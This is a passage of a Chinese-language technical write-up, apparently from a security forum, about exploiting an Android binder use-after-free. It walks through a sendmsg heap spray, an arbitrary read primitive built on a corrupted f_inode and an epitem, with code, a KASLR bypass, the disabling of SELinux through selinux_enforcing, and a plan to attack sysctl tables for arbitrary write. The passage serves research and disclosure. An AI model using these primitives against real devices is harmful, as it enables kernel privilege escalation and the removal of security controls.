
## 0x05 重新分配具有任意内容的释放节点

上面描述的获取导致内存崩溃的`unlink`原语的步骤假定可以用受控对象替换释放的对象。我们不需要完全控制该对象，而只需要通过所有检查并触发`*hlist_del*`原语而不会崩溃即可。

为了实现这一点，我们使用了一种众所周知的技术：通过`sendmsg` syscall 堆喷控制消息。该系统调用的代码如下所示：

```
static int \_\_\_sys\_sendmsg(struct socket \*sock, struct user\_msghdr \_\_user \*msg,
struct msghdr \*msg\_sys, unsigned int flags,
struct used\_address \*used\_address,
unsigned int allowed\_msghdr\_flags)
{
struct compat\_msghdr \_\_user \*msg\_compat =
(struct compat\_msghdr \_\_user \*)msg;
struct sockaddr\_storage address;
struct iovec iovstack[UIO\_FASTIOV], \*iov = iovstack;
unsigned char ctl[sizeof(struct cmsghdr) + 20]
\_\_attribute\_\_ ((aligned(sizeof(\_\_kernel\_size\_t))));
/\* 20 is size of ipv6\_pktinfo \*/
unsigned char \*ctl\_buf = ctl;
int ctl\_len;
ssize\_t err;
...
if (ctl\_len > sizeof(ctl)) {
[1] ctl\_buf = sock\_kmalloc(sock->sk, ctl\_len, GFP\_KERNEL);
if (ctl\_buf == NULL)
goto out\_freeiov;
}
err = -EFAULT;
/\*
\* Careful! Before this, msg\_sys->msg\_control contains a user pointer.
\* Afterwards, it will be a kernel pointer. Thus the compiler-assisted
\* checking falls down on this.
\*/
[2] if (copy\_from\_user(ctl\_buf,
(void \_\_user \_\_force \*)msg\_sys->msg\_control,
ctl\_len))
goto out\_freectl;
msg\_sys->msg\_control = ctl\_buf;
}
...
out\_freectl:
if (ctl\_buf != ctl)
[3] sock\_kfree\_s(sock->sk, ctl\_buf, ctl\_len);
out\_freeiov:
kfree(iov);
return err;
}
```

如果请求的控制消息长度大于本地`*ctl*`缓冲区，则在*`[1]`*处将在内核堆上分配一个缓冲区。在*`[2]`*处*，从用户区复制控制消息，最后在*`[3]`*处处理消息后，释放分配的缓冲区。

一旦目标套接字缓冲区已满，我们将使用阻塞调用来使系统调用阻塞，因此在点*`[2]`*和*`[3]`*之间的线程之后进行阻塞。这样，我们可以控制替换对象的生存期。

还可以利用Jann Horn在其<a href="elink@527K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9J5i4K6u0r3L8h3W2@1K9h3N6S2N6r3W2G2L8Y4y4Q4x3X3c8S2M7X3g2Q4x3X3c8S2N6s2c8S2j5$3E0Q4x3X3c8K6N6i4u0X3j5h3y4W2i4K6u0V1N6r3!0G2i4K6u0W2K9s2c8E0L8l9`.`.">PROCA攻击中</a>使用的方法：让`sendmsg`调用完成，并立即使用`signalfd`文件描述符重新分配该对象，这样的好处是不需要为每个分配使用单独的线程。

在任何情况下，使用这种类型的喷射，我们都可以按照几乎完全控制的方式重新分配释放的`*binder节点*`，以便触发前面所述的写原语。

但是要注意的一件事是，如果我们的喷射失败，由于释放的内存上要执行的操作和检查量很大，最终将导致内核崩溃。但是，这种UAF的特性非常好，只要我们不触发写原语，就可以简单地关闭`binder`文件描述符，并且不会对内核有任何影响。

因此，在尝试触发写原语之前，我们使用泄漏原语来验证是否已成功重新分配节点。为此，只需拥有大量待处理的`transaction`，并在每次需要从释放的对象中泄漏一些数据时读取一个`transaction`。如果数据不是我们期望的，可以简单地关闭`binder`文件描述符，然后重试。

即使存在相对不可靠的重新分配，此属性也使漏洞利用非常可靠。

## 0x06 获取任意读取原语

此时，我们使用与OffensiveCon 2020演讲中所述相同的任意读取技术。也就是说，我们破坏了`*file-> f_inode*`并使用<a href="elink@b1fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3L8i4y4E0i4K6u0r3i4K6u0n7i4K6u0r3M7X3g2X3M7#2)9J5c8Y4c8S2k6%4y4Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0V1x3e0m8Q4x3X3f1H3i4K6u0W2x3q4)9#2k6Y4t1H3i4K6u0W2y4o6u0Q4x3V1k6X3M7#2)9J5c8X3W2G2j5%4c8D9i4K6u0W2j5#2)9J5x3K6j5%4x3b7`.`.">以下代码</a> 执行读取：

```
int do\_vfs\_ioctl(struct file \*filp, unsigned int fd, unsigned int cmd,
unsigned long arg)
{
int error = 0;
int \_\_user \*argp = (int \_\_user \*)arg;
struct inode \*inode = file\_inode(filp);
switch (cmd) {
...
case FIGETBSZ:
return put\_user(inode->i\_sb->s\_blocksize, argp);
...
```

如果看了我们的PPT，早在2018年末，我们就使用了`binder mapping spray`绕过PAN，并在受控位置获得了受控数据。但是，在摆脱内核端绑定程序映射的同时，引入了我们在此处利用的漏洞。这意味着我们不能再使用`binder mapping spray`，必须找到另一种解决方案。

我们`*想到*`的解决方案是将`*f_inode*`字段指向一个`**epitem**`结构。该结构包含一个完全可控制的64位字段：`*event.data*`字段。可以使用`*ep_ctl（efd，EPOLL_CTL_MOD，fd，＆event）*`修改此字段。因此，如果将`*数据*`字段与`*inode-> i_sb*`字段对齐，将能够执行任意读取。

下图以图形方式展示了设置：

![img](upload/attach/202005/823237\_D4RTJ849W84MB47.jpg)

我们破坏了基于`*epitem*`的 `*fllink.next*` 内存区域 ，由于我们获得了写原语就可以指回`*file->f_inode*` 。如果曾经使用过此字段，则可能会出现问题，但是由于我们是这些`*struct文件*`和 `*Epitem*`实例的唯一用户，因此 只需避免调用任何使用它们的API就可以了。

基于上面描述的设置，我们现在可以如下构建一个任意读取原语：

```
uint64\_t read32(uint64\_t addr) {
struct epoll\_event evt;
evt.events = 0;
evt.data.u64 = addr - 24;
int err = epoll\_ctl(file->ep\_fd, EPOLL\_CTL\_MOD, pipes[0], &evt);
uint32\_t test = 0xdeadbeef;
ioctl(pipes[0], FIGETBSZ, &test);
return test;
}
uint64\_t read64(uint64\_t addr) {
uint32\_t lo = read32(addr);
uint32\_t hi = read32(addr+4);
return (((uint64\_t)hi) << 32) | lo;
}
```

请注意，我们的数据字段设置 `*epitem*`到 `*地址- 24*`，其中24偏移的 `*s_blocksize*`的结构。同样，即使 `*s_blocksize*`原则上是64位长，但 `*ioctl*`代码仅将32位复制回用户区，因此如果要读取64位值，我们需要读取两次。

现在有了一个任意的读取原语，并且从最初的泄漏中知道了`*结构文件*`的地址，我们可以简单地读取`*f_op*` 字段来检索内核.text指针。

这会导致完全绕过KASLR：

```
/\* Step 1: leak a pipe file address \*/
file = node\_new("leak\_file");
/\* Only works on file implementing the 'epoll' function. \*/
while (!node\_realloc\_epitem(file, pipes[0]))
node\_reset(file);
uint64\_t file\_addr = file->file\_addr;
log\_info("[+] pipe file: 0x%lx\n", file\_addr);
/\* Step 2: leak epitem address \*/
struct exp\_node \*epitem\_node = node\_new("epitem");
while (!node\_kaddr\_disclose(file, epitem\_node))
node\_reset(epitem\_node);
printf("[\*] file epitem at %lx\n", file->kaddr);
/\*
\* Alright, now we want to do a write8 to set file->f\_inode.
\* Given the unlink primitive, we'll set file->f\_inode = epitem + 80
\* and epitem + 88 = &file->f\_inode.
\*
\* With this we can change f\_inode->i\_sb by modifying the epitem data,
\* and get an arbitrary read through ioctl.
\*
\* This is corrupting the fllink, so we better don't touch anything there!
\*/
struct exp\_node \*write8\_inode = node\_new("write8\_inode");
node\_write8(write8\_inode, file->kaddr + 120 - 40 , file\_addr + 0x20);
printf("[\*] Write done, should have arbitrary read now.\n");
uint64\_t fop = read64(file\_addr + 0x28);
printf("[+] file operations: %lx\n", fop);
kernel\_base = fop - OFFSET\_PIPE\_FOP;
printf("[+] kernel base: %lx\n", kernel\_base);
```

## 0x07 禁用SELinux并设置任意写原语

现在我们知道了内核基地址，可以使用写原语在`*selinux_enforcing*`变量上写一个NULL qword 并将SELinux设置为许可模式。我们的漏洞利用程序在设置任意写入原语之前会执行此操作，因为我们提出的技术实际上需要禁用SELinux。

在考虑了几种选择之后，我们最终决定攻击内核用来处理*`/ proc / sys*`的`sysctl`表以及从那里`hook`所有数据。有许多描述这些变量的全局表，例如下面的<a href="elink@002K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3L8i4y4E0i4K6u0r3i4K6u0n7i4K6u0r3M7X3g2X3M7#2)9J5c8Y4c8S2k6%4y4Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0V1x3e0m8Q4x3X3f1H3i4K6u0W2x3q4)9#2k6Y4t1H3i4K6u0W2y4o6u0Q4x3V1k6C8k6i4u0F1k6h3I4Q4x3V1k6K6P5i4y4U0N6r3I4Q4x3X3g2U0i4K6t1K6x3U0j5$3">kern_table</a>：

```
static struct ctl\_table kern\_table[] = {
{
.procname = "sched\_child\_runs\_first",
.data = &sysctl\_sched\_child\_runs\_first,
.maxlen = sizeof(unsigned int),
.mode = 0644,
.proc\_handler = proc\_dointvec,
},
#if defined(CONFIG\_PREEMPT\_TRACER) || defined(CONFIG\_IRQSOFF\_TRACER)
{
.procname = "preemptoff\_tracing\_threshold\_ns",
.data = &sysctl\_preemptoff\_tracing\_threshold\_ns,
.maxlen = sizeof(unsigned int),
.mode = 0644,
.proc\_handler = proc\_dointvec,
},
{
.procname = "irqsoff\_tracing\_threshold\_ns",
.data = &sysctl\_irqsoff\_tracing\_threshold\_ns,
.maxlen = sizeof(unsigned int),
.mode = 0644,
.proc\_handler = proc\_dointvec,
},
...
```

例如，第一个变量是“ sched_child_runs_first”，这意味着可以通过*`/ proc / sys / kernel / sched_child_runs_first*`对其进行访问。文件模式为0644，所以它只能写为root（当然SELinux限制可能适用），它是一个整数。读写由`*proc_dointvec*`函数处理，该函数将在访问文件时将整数与字符串表示形式进行转换。该`*数据*`字段指向其中变量在内存中，以获得任意的读/写原语。

我们最初尝试将其中一些变量作为目标，但随后意识到该表实际上仅在内核初始化期间使用。这意味着破坏该表的内容对我们不是很有用。但是，此表用于创建一组内存结构，这些内存结构定义了现有的`sysctl`变量及其权限。

这些结构可以通过分析<a href="elink@3cdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3L8i4y4E0i4K6u0r3i4K6u0n7i4K6u0r3M7X3g2X3M7#2)9J5c8Y4c8S2k6%4y4Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0V1x3e0m8Q4x3X3f1H3i4K6u0W2x3q4)9#2k6Y4t1H3i4K6u0W2y4o6u0Q4x3V1k6X3M7#2)9J5c8Y4m8J5L8$3y4Q4x3V1k6H3M7X3!0U0i4K6g2X3M7%4W2K6j5%4c8D9i4K6u0W2j5#2)9J5x3K6j5J5">sysctl_table_root</a>结构找到，该结构包含一个`*ctl_node*`节点的`rb-tree` ，然后指向定义变量本身的`*ctl_table*`表。由于我们具有读取原语，因此可以解析并找到其中的最左边的节点，该节点没有子节点。

在正常情况下，tree如下图所示：

![img](upload/attach/202005/823237\_954DWVTS4URQZMQ.jpg)

如果查看这些节点的字母顺序，可以看到所有左子节点均按字母降序排序。实际上，这是这些树中的平衡规则：左子级必须比当前节点低，而右子级必须更高。
